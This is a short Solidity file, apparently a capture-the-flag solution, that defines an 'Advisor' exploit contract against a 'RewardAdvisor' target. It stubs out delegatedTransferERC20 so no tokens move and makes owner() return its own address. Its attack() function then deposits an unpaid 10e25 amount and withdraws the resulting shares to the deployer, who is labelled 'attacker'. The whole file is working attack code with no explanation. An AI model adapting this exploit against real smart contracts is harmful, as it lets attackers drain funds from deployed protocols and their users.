//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IRewardAdvisor {
    function deposit(uint256 farmDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract Advisor {
    address attacker;
    IRewardAdvisor advisor;

    constructor(address advisorAddress) {
        attacker = msg.sender;
        advisor = IRewardAdvisor(advisorAddress);
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {}

    function owner() external view returns (address) {
        return address(this);
    }

    function attack() public {
        uint256 shares = advisor.deposit(10e25, payable(address(this)), address(this));

        advisor.withdraw(shares, attacker, payable(address(this)));
    }
}
